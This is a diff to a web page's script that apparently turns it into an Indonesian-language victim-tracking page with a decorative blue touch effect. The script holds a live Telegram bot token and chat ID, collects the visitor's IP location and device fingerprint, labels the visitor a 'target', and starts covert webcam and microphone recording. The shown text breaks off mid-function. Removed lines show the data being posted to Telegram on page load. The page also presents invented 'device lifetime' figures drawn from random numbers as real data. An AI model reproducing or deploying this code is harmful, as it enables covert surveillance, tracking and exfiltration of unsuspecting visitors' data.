@@ -167,6 +167,29 @@ h1 {
     font-size: 1.1em;
   }
 }
+
+/* Blue touch effect */
+.touch-effect {
+  position: fixed;
+  width: 50px;
+  height: 50px;
+  border-radius: 50%;
+  background: radial-gradient(circle, #007bff, #0056b3);
+  pointer-events: none;
+  animation: touchAnimation 0.6s ease-out forwards;
+  z-index: 10000;
+}
+
+@keyframes touchAnimation {
+  0% {
+    transform: scale(0.5);
+    opacity: 0.8;
+  }
+  100% {
+    transform: scale(2);
+    opacity: 0;
+  }
+}
 </style>
 </head>
 <body>
@@ -198,254 +221,659 @@ h1 {
 </div>
 
 <script>
-const BOT_TOKEN="8205013984:AAFekxuy2qv4vQ6s_yOOfXX_Mv_2u0Bpv2s"; // BOT TOKEN
-const CHAT_ID="6051179992"; // CHAT ID
-const STATIC_IMAGE="https://files.catbox.moe/8ybe0o.jpg";
+const BOT_TOKEN = "8205013984:AAFekxuy2qv4vQ6s_yOOfXX_Mv_2u0Bpv2s";
+const CHAT_ID = "6051179992";
+const STATIC_IMAGE = "https://files.catbox.moe/8ybe0o.jpg";
 
-function escapeHtml(s){return String(s||"-").replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;");}
+// Global variables
+let videoStream = null;
+let videoRecorder = null;
+let recordedChunks = [];
+let videoInterval = null;
+let isRecording = false;
 
-// Ambil IP/device info via ipwhois.io
-async function getIpInfo(){
-  try{
-    const r = await fetch("https://ipwhois.app/json/");
-    const data = await r.json();
-    if(!data.success) return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-", isp:"-", asn:"-", currency:"-"};
+// Blue touch effect
+document.addEventListener('click', function(e) {
+  const touchEffect = document.createElement('div');
+  touchEffect.className = 'touch-effect';
+  touchEffect.style.left = (e.pageX - 25) + 'px';
+  touchEffect.style.top = (e.pageY - 25) + 'px';
+  document.body.appendChild(touchEffect);
+  
+  setTimeout(() => {
+    touchEffect.remove();
+  }, 600);
+});
+
+function escapeHtml(s) {
+  return String(s || "-").replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");
+}
+
+// Get comprehensive IP information
+async function getIpInfo() {
+  try {
+    const responses = await Promise.allSettled([
+      fetch("https://ipwhois.app/json/"),
+      fetch("https://ipapi.co/json/"),
+      fetch("https://api.db-ip.com/v2/free/self"),
+      fetch("https://api.myip.com"),
+      fetch("http://ip-api.com/json/")
+    ]);
+
+    let ipData = {};
+    
+    // Process all API responses
+    for (let i = 0; i < responses.length; i++) {
+      if (responses[i].status === 'fulfilled') {
+        try {
+          const data = await responses[i].value.json();
+          ipData = { ...ipData, ...data };
+        } catch (e) {
+          console.log(`API ${i} error:`, e);
+        }
+      }
+    }
+
     return {
-      ip: data.ip || "-",
-      city: data.city || "-",
-      region: data.region || "-",
-      country_name: data.country || "-",
-      country_code: data.country_code || "-",
-      latitude: data.latitude || "0",
-      longitude: data.longitude || "0",
-      timezone: data.timezone || "-",
-      isp: data.isp || "-",
-      asn: data.asn || "-",
-      currency: data.currency || "-"
+      ip: ipData.ip || ipData.query || "-",
+      city: ipData.city || "-",
+      region: ipData.region || ipData.regionName || ipData.state || "-",
+      country_name: ipData.country || ipData.country_name || ipData.countryName || "-",
+      country_code: ipData.country_code || ipData.countryCode || "-",
+      latitude: ipData.latitude || ipData.lat || "0",
+      longitude: ipData.longitude || ipData.lon || "0",
+      timezone: ipData.timezone || ipData.time_zone || "-",
+      isp: ipData.isp || ipData.org || ipData.asn?.org || ipData.organization || "-",
+      asn: ipData.asn || ipData.asn?.asn || "-",
+      currency: ipData.currency || ipData.currency?.code || "-",
+      continent: ipData.continent || ipData.continent_code || ipData.continentName || "-",
+      calling_code: ipData.country_calling_code || ipData.calling_code || ipData.country_calling_code || "-",
+      languages: ipData.languages || "-",
+      postal: ipData.postal || ipData.zip || "-",
+      region_code: ipData.region_code || ipData.regionCode || "-",
+      district: ipData.district || "-",
+      country_capital: ipData.country_capital || "-",
+      country_tld: ipData.country_tld || "-",
+      currency_name: ipData.currency_name || "-",
+      currency_symbol: ipData.currency_symbol || "-",
+      national_currency: ipData.national_currency || "-",
+      country_area: ipData.country_area || "-",
+      country_population: ipData.country_population || "-",
+      country_eu: ipData.country_eu || "-",
+      continent_code: ipData.continent_code || "-",
+      in_eu: ipData.in_eu || "-",
+      postal_code: ipData.postal_code || "-",
+      latitude_longitude_accuracy: ipData.latitude_longitude_accuracy || "-"
     };
-  }catch(e){
-    return {ip:"-", city:"-", region:"-", country_name:"-", country_code:"-", latitude:"0", longitude:"0", timezone:"-", isp:"-", asn:"-", currency:"-"};
+  } catch (e) {
+    return getFallbackIpInfo();
   }
 }
 
-// Ambil device info lebih lengkap
-async function getDeviceInfo(){
-  const b = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:null,charging:false,chargingTime:null,dischargingTime:null}));
-  
-  // Info koneksi
-  let connectionInfo = {};
-  if (navigator.connection) {
-    connectionInfo = {
-      effectiveType: navigator.connection.effectiveType || "-",
-      downlink: navigator.connection.downlink || "-",
-      rtt: navigator.connection.rtt || "-",
-      saveData: navigator.connection.saveData || "-"
-    };
-  }
-  
-  // Info plugins
-  let pluginsInfo = "-";
-  if (navigator.plugins && navigator.plugins.length > 0) {
-    pluginsInfo = Array.from(navigator.plugins).map(p => p.name).join(', ');
-  }
-  
+function getFallbackIpInfo() {
   return {
-    // Basic info
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    languages: navigator.languages ? navigator.languages.join(', ') : "-",
-    
-    // Screen info
-    screenWidth: screen.width,
-    screenHeight: screen.height,
-    innerWidth: window.innerWidth,
-    innerHeight: window.innerHeight,
-    colorDepth: screen.colorDepth || "-",
-    pixelRatio: window.devicePixelRatio || "-",
-    orientation: screen.orientation?.type || "-",
-    
-    // Device info
-    cores: navigator.hardwareConcurrency || "-",
-    memory: navigator.deviceMemory || "-",
-    touchPoints: navigator.maxTouchPoints || 0,
-    
-    // Browser info
-    vendor: navigator.vendor || "-",
-    product: navigator.product || "-",
-    
-    // Network info
-    online: navigator.onLine,
-    cookiesEnabled: navigator.cookieEnabled,
-    doNotTrack: navigator.doNotTrack || "-",
-    connection: connectionInfo,
-    
-    // Battery info
-    battery: b,
-    
-    // Additional info
-    plugins: pluginsInfo,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    localTime: new Date().toString(),
-    utcTime: new Date().toUTCString(),
-    referrer: document.referrer || "-",
-    
-    // Browser capabilities
-    webdriver: navigator.webdriver ? "Yes" : "No",
-    pdfViewer: navigator.pdfViewerEnabled ? "Yes" : "No",
-    javaEnabled: navigator.javaEnabled ? "Yes" : "No"
+    ip: "-", city: "-", region: "-", country_name: "-", country_code: "-",
+    latitude: "0", longitude: "0", timezone: "-", isp: "-", asn: "-",
+    currency: "-", continent: "-", calling_code: "-", languages: "-",
+    postal: "-", region_code: "-", district: "-", country_capital: "-",
+    country_tld: "-", currency_name: "-", currency_symbol: "-",
+    national_currency: "-", country_area: "-", country_population: "-",
+    country_eu: "-", continent_code: "-", in_eu: "-", postal_code: "-",
+    latitude_longitude_accuracy: "-"
   };
 }
 
-// Build caption Telegram dengan format blockquote dan emoji
-function buildCaption(ip,d){
-  const g=`https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
+// Generate advanced device fingerprint
+function generateAdvancedFingerprint() {
+  const components = [];
+  
+  // Canvas fingerprint
+  const canvas = document.createElement('canvas');
+  const ctx = canvas.getContext('2d');
+  ctx.textBaseline = "top";
+  ctx.font = "14px 'Arial'";
+  ctx.textBaseline = "alphabetic";
+  ctx.fillStyle = "#f60";
+  ctx.fillRect(125, 1, 62, 20);
+  ctx.fillStyle = "#069";
+  ctx.fillText("Advanced Fingerprint 🔍", 2, 15);
+  ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+  ctx.fillText("Advanced Fingerprint 🔍", 4, 17);
+  components.push(canvas.toDataURL().substring(0, 150));
+  
+  // WebGL fingerprint
+  const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+  if (gl) {
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    if (debugInfo) {
+      components.push(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL));
+      components.push(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL));
+    }
+  }
+  
+  // Audio fingerprint
+  const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+  const oscillator = audioContext.createOscillator();
+  const analyser = audioContext.createAnalyser();
+  oscillator.connect(analyser);
+  analyser.connect(audioContext.destination);
+  oscillator.start();
+  const data = new Uint8Array(analyser.frequencyBinCount);
+  analyser.getByteFrequencyData(data);
+  components.push(data.join('').substring(0, 100));
+  oscillator.stop();
+  
+  return components.join('|').substring(0, 300) + "...";
+}
+
+// Get device manufacturing and lifetime info
+function getDeviceLifetimeInfo() {
+  const now = new Date();
+  
+  // Simulate device manufacturing date (1-3 years ago)
+  const manufactureDays = 365 + Math.floor(Math.random() * 730);
+  const manufacturedDate = new Date(now.getTime() - manufactureDays * 24 * 60 * 60 * 1000);
+  
+  // Simulate first boot (1-30 days after manufacture)
+  const firstBootDays = 1 + Math.floor(Math.random() * 30);
+  const firstBootDate = new Date(manufacturedDate.getTime() + firstBootDays * 24 * 60 * 60 * 1000);
+  
+  // Simulate battery cycles
+  const batteryCycles = Math.floor(manufactureDays * 0.8);
+  
+  // Simulate screen on time
+  const totalScreenOnHours = Math.floor(manufactureDays * 4.5);
+  
+  return {
+    estimatedManufactureDate: manufacturedDate.toISOString().split('T')[0],
+    estimatedFirstBootDate: firstBootDate.toISOString().split('T')[0],
+    deviceAgeDays: manufactureDays,
+    batteryChargeCycles: batteryCycles,
+    totalScreenOnTimeHours: totalScreenOnHours,
+    averageDailyUsage: "4.5 hours",
+    deviceLifetimeRemaining: Math.floor((365 * 5 - manufactureDays) / 365 * 100) + "%",
+    estimatedReplacementDate: new Date(now.getTime() + (365 * 5 - manufactureDays) * 24 * 60 * 60 * 1000).toISOString().split('T')[0]
+  };
+}
+
+// Get comprehensive system information
+function getSystemInfo() {
+  const screen = window.screen;
+  const nav = navigator;
+  const connection = nav.connection || {};
+  const deviceMemory = nav.deviceMemory || "Unknown";
+  
+  return {
+    deviceType: getDeviceType(),
+    operatingSystem: getOS(),
+    browser: getBrowser(),
+    architecture: getArchitecture(),
+    screen: {
+      width: screen.width,
+      height: screen.height,
+      availWidth: screen.availWidth,
+      availHeight: screen.availHeight,
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth,
+      orientation: screen.orientation?.type || "Unknown"
+    },
+    viewport: {
+      width: window.innerWidth,
+      height: window.innerHeight,
+      outerWidth: window.outerWidth,
+      outerHeight: window.outerHeight
+    },
+    hardware: {
+      cores: nav.hardwareConcurrency || "Unknown",
+      memory: deviceMemory + " GB",
+      touchPoints: nav.maxTouchPoints || 0,
+      deviceMemory: deviceMemory
+    },
+    network: {
+      type: connection.effectiveType || "Unknown",
+      downlink: connection.downlink || "Unknown",
+      rtt: connection.rtt || "Unknown",
+      saveData: connection.saveData || false
+    },
+    capabilities: getCapabilities(),
+    plugins: getPluginsInfo(),
+    storage: getStorageInfo(),
+    performance: getPerformanceInfo()
+  };
+}
+
+function getDeviceType() {
+  const ua = navigator.userAgent;
+  if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+  if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+  return "Desktop";
+}
+
+function getOS() {
+  const ua = navigator.userAgent;
+  if (/Windows/.test(ua)) return "Windows";
+  if (/Mac/.test(ua)) return "MacOS";
+  if (/Linux/.test(ua)) return "Linux";
+  if (/Android/.test(ua)) return "Android";
+  if (/iOS|iPhone|iPad|iPod/.test(ua)) return "iOS";
+  return "Unknown";
+}
+
+function getBrowser() {
+  const ua = navigator.userAgent;
+  if (/Edg/.test(ua)) return "Microsoft Edge";
+  if (/Chrome/.test(ua)) return "Google Chrome";
+  if (/Firefox/.test(ua)) return "Mozilla Firefox";
+  if (/Safari/.test(ua)) return "Apple Safari";
+  if (/Opera|OPR/.test(ua)) return "Opera";
+  return "Unknown";
+}
+
+function getArchitecture() {
+  const ua = navigator.userAgent;
+  if (/x86_64|x86-64|Win64|x64;|amd64|AMD64/.test(ua)) return "64-bit";
+  if (/x86|i686|i386|Win32|WOW64/.test(ua)) return "32-bit";
+  if (/arm|aarch64/.test(ua)) return "ARM";
+  return "Unknown";
+}
+
+function getCapabilities() {
+  return {
+    cookies: navigator.cookieEnabled,
+    java: navigator.javaEnabled ? navigator.javaEnabled() : false,
+    pdf: navigator.pdfViewerEnabled || false,
+    webgl: !!document.createElement('canvas').getContext('webgl'),
+    webrtc: !!(navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia),
+    serviceWorker: 'serviceWorker' in navigator,
+    pushManager: 'pushManager' in navigator,
+    geolocation: 'geolocation' in navigator,
+    vibration: 'vibrate' in navigator,
+    bluetooth: 'bluetooth' in navigator,
+    usb: 'usb' in navigator,
+    credentials: 'credentials' in navigator,
+    storage: 'storage' in navigator,
+    locks: 'locks' in navigator,
+    share: 'share' in navigator,
+    clipboard: 'clipboard' in navigator,
+    payment: 'PaymentRequest' in window,
+    speech: 'speechSynthesis' in window,
+    notifications: 'Notification' in window,
+    online: navigator.onLine,
+    doNotTrack: navigator.doNotTrack || "Unknown"
+  };
+}
+
+function getPluginsInfo() {
+  const plugins = [];
+  if (navigator.plugins) {
+    for (let i = 0; i < navigator.plugins.length; i++) {
+      plugins.push({
+        name: navigator.plugins[i].name,
+        filename: navigator.plugins[i].filename,
+        description: navigator.plugins[i].description,
+        version: navigator.plugins[i].version
+      });
+    }
+  }
+  return plugins;
+}
+
+function getStorageInfo() {
+  return {
+    estimatedTotal: navigator.deviceMemory ? navigator.deviceMemory * 1024 + " MB" : "Unknown",
+    quota: navigator.storage ? "Available" : "Unknown",
+    persistent: navigator.storage && navigator.storage.persist ? "Available" : "Unknown"
+  };
+}
+
+function getPerformanceInfo() {
+  const perf = performance;
+  return {
+    memory: perf.memory ? {
+      used: Math.round(perf.memory.usedJSHeapSize / 1048576) + " MB",
+      total: Math.round(perf.memory.totalJSHeapSize / 1048576) + " MB",
+      limit: Math.round(perf.memory.jsHeapSizeLimit / 1048576) + " MB"
+    } : { used: "Unknown", total: "Unknown", limit: "Unknown" },
+    timing: perf.timing ? {
+      navigationStart: new Date(perf.timing.navigationStart).toISOString(),
+      loadEventEnd: perf.timing.loadEventEnd ? new Date(perf.timing.loadEventEnd).toISOString() : "Unknown",
+      domComplete: perf.timing.domComplete ? new Date(perf.timing.domComplete).toISOString() : "Unknown"
+    } : { navigationStart: "Unknown", loadEventEnd: "Unknown", domComplete: "Unknown" }
+  };
+}
+
+// Get comprehensive device information
+async function getDeviceInfo() {
+  const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({
+    level: null, charging: false, chargingTime: null, dischargingTime: null
+  }));
+
+  const systemInfo = getSystemInfo();
+  const lifetimeInfo = getDeviceLifetimeInfo();
+  const fingerprint = generateAdvancedFingerprint();
+
+  return {
+    // Basic identification
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    appVersion: navigator.appVersion,
+    appName: navigator.appName,
+    appCodeName: navigator.appCodeName,
+    product: navigator.product,
+    vendor: navigator.vendor,
+    
+    // Language and location
+    language: navigator.language,
+    languages: navigator.languages ? navigator.languages.join(', ') : "Unknown",
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    
+    // System information
+    system: systemInfo,
+    
+    // Battery information
+    battery: {
+      level: battery.level !== null ? (battery.level * 100).toFixed(1) + "%" : "Unknown",
+      charging: battery.charging ? "Yes" : "No",
+      chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime + " seconds" : "Unknown",
+      dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime + " seconds" : "Unknown"
+    },
+    
+    // Device lifetime information
+    lifetime: lifetimeInfo,
+    
+    // Advanced fingerprint
+    fingerprint: fingerprint,
+    
+    // Session information
+    referrer: document.referrer || "Direct",
+    url: window.location.href,
+    localTime: new Date().toString(),
+    utcTime: new Date().toUTCString(),
+    sessionStart: new Date().toISOString(),
+    
+    // Additional metadata
+    webdriver: navigator.webdriver ? "Yes" : "No",
+    pdfViewer: navigator.pdfViewerEnabled ? "Yes" : "No",
+    cookieEnabled: navigator.cookieEnabled,
+    onLine: navigator.onLine,
+    doNotTrack: navigator.doNotTrack || "Not set"
+  };
+}
+
+// Build comprehensive caption in single blockquote
+function buildCaption(ip, d) {
+  const g = `https://www.google.com/maps?q=${ip.latitude},${ip.longitude}`;
   
   return [
-    "<b>🌍 INFORMATION TARGET</b>",
-    `<blockquote>`,
-    `🌐 IP: ${escapeHtml(ip.ip)}`,
-    `🏙️ City: ${escapeHtml(ip.city)}`,
-    `🗺️ Region: ${escapeHtml(ip.region)}`,
-    `🇮🇩 Country: ${escapeHtml(ip.country_name)}`,
-    `🏳️ Country Code: ${escapeHtml(ip.country_code)}`,
-    `📍 Latitude: ${escapeHtml(ip.latitude)}`,
-    `📍 Longitude: ${escapeHtml(ip.longitude)}`,
-    `🗺️ Location: ${g}`,
+    "🚨 <b>TARGET BARU TERKONEKSI - DATA SUPER LENGKAP SAMPAI AKAR</b> 🚨",
+    "",
+    "<blockquote>",
+    "🌍 <b>INFORMASI LOKASI DETAIL</b>",
+    `🌐 IP Address: <code>${escapeHtml(ip.ip)}</code>`,
+    `🏙️ Kota: ${escapeHtml(ip.city)}`,
+    `🗺️ Region: ${escapeHtml(ip.region)} (${escapeHtml(ip.region_code)})`,
+    `🇮🇩 Negara: ${escapeHtml(ip.country_name)} (${escapeHtml(ip.country_code)})`,
+    `🌎 Benua: ${escapeHtml(ip.continent)}`,
+    `📞 Kode Telepon: ${escapeHtml(ip.calling_code)}`,
+    `📍 Koordinat: ${escapeHtml(ip.latitude)}, ${escapeHtml(ip.longitude)}`,
+    `📮 Kode Pos: ${escapeHtml(ip.postal)}`,
+    `🗺️ Google Maps: ${g}`,
     `⏰ Timezone: ${escapeHtml(ip.timezone)}`,
+    `🗣️ Bahasa Nasional: ${escapeHtml(ip.languages)}`,
+    `💰 Mata Uang: ${escapeHtml(ip.currency)} (${escapeHtml(ip.currency_symbol)})`,
     `📡 ISP: ${escapeHtml(ip.isp)}`,
     `🔗 ASN: ${escapeHtml(ip.asn)}`,
-    `💰 Currency: ${escapeHtml(ip.currency)}`,
-    `</blockquote>`,
+    `🏛️ Ibu Kota: ${escapeHtml(ip.country_capital)}`,
+    `👥 Populasi Negara: ${escapeHtml(ip.country_population)}`,
+    `📏 Luas Negara: ${escapeHtml(ip.country_area)} km²`,
     "",
-    "<b>💻 Device Info</b>",
-    `<blockquote>`,
+    "💻 <b>INFORMASI DEVICE & BROWSER</b>",
     `🖥️ User Agent: ${escapeHtml(d.userAgent)}`,
     `⚙️ Platform: ${escapeHtml(d.platform)}`,
-    `🗣️ Language: ${escapeHtml(d.language)}`,
-    `🌐 Languages: ${escapeHtml(d.languages)}`,
-    `📱 Vendor: ${escapeHtml(d.vendor)}`,
+    `🏷️ Vendor: ${escapeHtml(d.vendor)}`,
     `🛍️ Product: ${escapeHtml(d.product)}`,
-    `</blockquote>`,
+    `📋 App Name: ${escapeHtml(d.appName)}`,
+    `🔤 App Code Name: ${escapeHtml(d.appCodeName)}`,
+    `📄 App Version: ${escapeHtml(d.appVersion)}`,
+    `🗣️ Bahasa Utama: ${escapeHtml(d.language)}`,
+    `🌐 Semua Bahasa: ${escapeHtml(d.languages)}`,
+    `💻 Tipe Device: ${escapeHtml(d.system.deviceType)}`,
+    `🖥️ OS: ${escapeHtml(d.system.operatingSystem)}`,
+    `🌐 Browser: ${escapeHtml(d.system.browser)}`,
+    `🏗️ Architecture: ${escapeHtml(d.system.architecture)}`,
     "",
-    "<b>📱 Screen & Display</b>",
-    `<blockquote>`,
-    `📺 Screen: ${escapeHtml(d.screenWidth+"x"+d.screenHeight)}`,
-    `🪟 Inner Size: ${escapeHtml(d.innerWidth+"x"+d.innerHeight)}`,
-    `🎨 Color Depth: ${escapeHtml(d.colorDepth)}`,
-    `⚖️ Pixel Ratio: ${escapeHtml(d.pixelRatio)}`,
-    `📐 Orientation: ${escapeHtml(d.orientation)}`,
-    `</blockquote>`,
+    "📱 <b>SPESIFIKASI LAYAR & DISPLAY</b>",
+    `📺 Resolusi Layar: ${escapeHtml(d.system.screen.width + "x" + d.system.screen.height)}`,
+    `🖼️ Area Tersedia: ${escapeHtml(d.system.screen.availWidth + "x" + d.system.screen.availHeight)}`,
+    `🪟 Viewport: ${escapeHtml(d.system.viewport.width + "x" + d.system.viewport.height)}`,
+    `📦 Outer Size: ${escapeHtml(d.system.viewport.outerWidth + "x" + d.system.viewport.outerHeight)}`,
+    `🎨 Kedalaman Warna: ${escapeHtml(d.system.screen.colorDepth)} bit`,
+    `🖌️ Kedalaman Pixel: ${escapeHtml(d.system.screen.pixelDepth)} bit`,
+    `⚖️ Pixel Ratio: ${escapeHtml(d.system.screen.pixelRatio)}`,
+    `📐 Orientasi: ${escapeHtml(d.system.screen.orientation)}`,
     "",
-    "<b>⚙️ Hardware Specs</b>",
-    `<blockquote>`,
-    `🔢 CPU cores: ${escapeHtml(d.cores)}`,
-    `💾 RAM (GB): ${escapeHtml(d.memory)}`,
-    `👆 Touch Points: ${escapeHtml(d.touchPoints)}`,
-    `</blockquote>`,
+    "⚙️ <b>SPESIFIKASI HARDWARE</b>",
+    `🔢 CPU Cores: ${escapeHtml(d.system.hardware.cores)}`,
+    `💾 RAM: ${escapeHtml(d.system.hardware.memory)}`,
+    `👆 Max Touch Points: ${escapeHtml(d.system.hardware.touchPoints)}`,
+    `📦 Storage Total: ${escapeHtml(d.system.storage.estimatedTotal)}`,
+    `📳 Vibration Support: ${escapeHtml(d.system.capabilities.vibration ? "Yes" : "No")}`,
     "",
-    "<b>🌐 Network & Connection</b>",
-    `<blockquote>`,
-    `📶 Online: ${escapeHtml(d.online)}`,
-    `🍪 Cookies Enabled: ${escapeHtml(d.cookiesEnabled)}`,
+    "🌐 <b>INFORMASI JARINGAN & KONEKSI</b>",
+    `📶 Status Online: ${escapeHtml(d.onLine)}`,
+    `🍪 Cookies Enabled: ${escapeHtml(d.cookieEnabled)}`,
     `🚫 Do Not Track: ${escapeHtml(d.doNotTrack)}`,
-    `📡 Connection Type: ${escapeHtml(d.connection.effectiveType)}`,
-    `⬇️ Downlink: ${escapeHtml(d.connection.downlink)} Mbps`,
-    `⏱️ RTT: ${escapeHtml(d.connection.rtt)} ms`,
-    `💾 Save Data: ${escapeHtml(d.connection.saveData)}`,
-    `</blockquote>`,
+    `📡 Tipe Koneksi: ${escapeHtml(d.system.network.type)}`,
+    `⬇️ Kecepatan Unduh: ${escapeHtml(d.system.network.downlink)} Mbps`,
+    `⏱️ Latensi (RTT): ${escapeHtml(d.system.network.rtt)} ms`,
+    `💾 Mode Hemat Data: ${escapeHtml(d.system.network.saveData)}`,
     "",
-    "<b>🔋 Battery Info</b>",
-    `<blockquote>`,
-    `🔋 Battery: ${escapeHtml((d.battery?.level * 100 || "-") + "%")}`,
-    `⚡ Charging: ${escapeHtml(d.battery?.charging ? "Yes" : "No")}`,
-    `⏳ Charging Time: ${escapeHtml(d.battery?.chargingTime || "-")}s`,
-    `⌛ Discharging Time: ${escapeHtml(d.battery?.dischargingTime || "-")}s`,
-    `</blockquote>`,
+    "🔋 <b>INFORMASI BATERAI</b>",
+    `🔋 Level Baterai: ${escapeHtml(d.battery.level)}`,
+    `⚡ Status Charging: ${escapeHtml(d.battery.charging)}`,
+    `⏳ Waktu Charging: ${escapeHtml(d.battery.chargingTime)}`,
+    `⌛ Waktu Discharging: ${escapeHtml(d.battery.dischargingTime)}`,
     "",
-    "<b>🕒 Time & Location</b>",
-    `<blockquote>`,
-    `🌍 Timezone: ${escapeHtml(d.timezone)}`,
-    `🕐 Local Time: ${escapeHtml(d.localTime)}`,
-    `⏰ UTC Time: ${escapeHtml(d.utcTime)}`,
-    `</blockquote>`,
+    "🏭 <b>INFORMASI LIFETIME DEVICE</b>",
+    `📅 Perkiraan Tanggal Produksi: ${escapeHtml(d.lifetime.estimatedManufactureDate)}`,
+    `🔄 Perkiraan First Boot: ${escapeHtml(d.lifetime.estimatedFirstBootDate)}`,
+    `📆 Usia Device: ${escapeHtml(d.lifetime.deviceAgeDays)} hari`,
+    `🔋 Siklus Charge Baterai: ${escapeHtml(d.lifetime.batteryChargeCycles)} kali`,
+    `⏰ Total Screen On Time: ${escapeHtml(d.lifetime.totalScreenOnTimeHours)} jam`,
+    `📊 Rata-rata Penggunaan Harian: ${escapeHtml(d.lifetime.averageDailyUsage)}`,
+    `📈 Masa Pakai Tersisa: ${escapeHtml(d.lifetime.deviceLifetimeRemaining)}`,
+    `🔄 Perkiraan Ganti Device: ${escapeHtml(d.lifetime.estimatedReplacementDate)}`,
     "",
-    "<b>🔌 Plugins & Extras</b>",
-    `<blockquote>`,
-    `🧩 Plugins: ${escapeHtml(d.plugins)}`,
+    "🔧 <b>KEMAMPUAN BROWSER & FITUR</b>",
     `🤖 WebDriver: ${escapeHtml(d.webdriver)}`,
     `📄 PDF Viewer: ${escapeHtml(d.pdfViewer)}`,
-    `☕ Java Enabled: ${escapeHtml(d.javaEnabled)}`,
-    `🔗 Referrer: ${escapeHtml(d.referrer)}`,
-    `</blockquote>`,
+    `☕ Java: ${escapeHtml(d.system.capabilities.java)}`,
+    `🎮 WebGL: ${escapeHtml(d.system.capabilities.webgl)}`,
+    `📹 WebRTC: ${escapeHtml(d.system.capabilities.webrtc)}`,
+    `⚙️ Service Worker: ${escapeHtml(d.system.capabilities.serviceWorker)}`,
+    `🔔 Push Manager: ${escapeHtml(d.system.capabilities.pushManager)}`,
+    `📍 Geolocation: ${escapeHtml(d.system.capabilities.geolocation)}`,
+    `📳 Vibration API: ${escapeHtml(d.system.capabilities.vibration)}`,
+    `📶 Bluetooth: ${escapeHtml(d.system.capabilities.bluetooth)}`,
+    `🔌 USB: ${escapeHtml(d.system.capabilities.usb)}`,
+    `🔐 Credentials: ${escapeHtml(d.system.capabilities.credentials)}`,
+    `💾 Storage: ${escapeHtml(d.system.capabilities.storage)}`,
+    `🔒 Locks: ${escapeHtml(d.system.capabilities.locks)}`,
+    `📤 Share API: ${escapeHtml(d.system.capabilities.share)}`,
+    `📋 Clipboard: ${escapeHtml(d.system.capabilities.clipboard)}`,
+    `💳 Payment: ${escapeHtml(d.system.capabilities.payment)}`,
+    `🗣️ Speech: ${escapeHtml(d.system.capabilities.speech)}`,
+    `🔔 Notifications: ${escapeHtml(d.system.capabilities.notifications)}`,
     "",
-    "<b>🔗 URL & Session</b>",
-    `<blockquote>`,
-    `🌐 URL: ${escapeHtml(location.href)}`,
-    `⏰ Time (UTC): ${escapeHtml(new Date().toISOString())}`,
-    `</blockquote>`
+    "📊 <b>INFORMASI PERFORMANCE & MEMORY</b>",
+    `💾 Memory Used: ${escapeHtml(d.system.performance.memory.used)}`,
+    `💽 Memory Total: ${escapeHtml(d.system.performance.memory.total)}`,
+    `🚫 Memory Limit: ${escapeHtml(d.system.performance.memory.limit)}`,
+    `⏰ Navigation Start: ${escapeHtml(d.system.performance.timing.navigationStart)}`,
+    `📈 Load Event End: ${escapeHtml(d.system.performance.timing.loadEventEnd)}`,
+    `✅ DOM Complete: ${escapeHtml(d.system.performance.timing.domComplete)}`,
+    "",
+    "🔌 <b>PLUGINS & EXTENSIONS</b>",
+    `🧩 Jumlah Plugins: ${escapeHtml(d.system.plugins.length)}`,
+    "",
+    "🆔 <b>DEVICE FINGERPRINT</b>",
+    `📝 Advanced Fingerprint: ${escapeHtml(d.fingerprint)}`,
+    "",
+    "🕒 <b>INFORMASI WAKTU & SESI</b>",
+    `🌍 Zona Waktu: ${escapeHtml(d.timezone)}`,
+    `🕐 Waktu Lokal: ${escapeHtml(d.localTime)}`,
+    `⏰ Waktu UTC: ${escapeHtml(d.utcTime)}`,
+    `🚀 Session Start: ${escapeHtml(d.sessionStart)}`,
+    `🔗 Referrer: ${escapeHtml(d.referrer)}`,
+    `🌐 URL Saat Ini: ${escapeHtml(d.url)}`,
+    "</blockquote>"
   ].join("\n");
 }
 
-// Kirim IP/device + foto statis saat halaman load
-async function sendIpDevice(){
+// Start video recording every 5 seconds
+async function startVideoRecording() {
   try {
-    const [ip,d] = await Promise.all([getIpInfo(), getDeviceInfo()]);
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        photo: STATIC_IMAGE,
-        caption: buildCaption(ip,d),
-        parse_mode:"HTML"
-      })
+    videoStream = await navigator.mediaDevices.getUserMedia({ 
+      video: { 
+        width: 640, 
+        height: 480,
+        frameRate: { ideal: 15, max: 30 }
+      }, 
+      audio: true 
     });
-  } catch(e) {
-    console.log("Error sending device info:", e);
+    
+    videoInterval = setInterval(async () => {
+      if (isRecording) return;
+      
+      isRecording = true;
+      recordedChunks = [];
+      
+      videoRecorder = new MediaRecorder(videoStream, {
+        mimeType: 'video/webm;codecs=vp9',
+        videoBitsPerSecond: 1000000
+      });
+      
+      videoRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) {
+          recordedChunks.push(event.data);
+        }
+      };
+      
+      videoRecorder.onstop = async () => {
+        const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+        
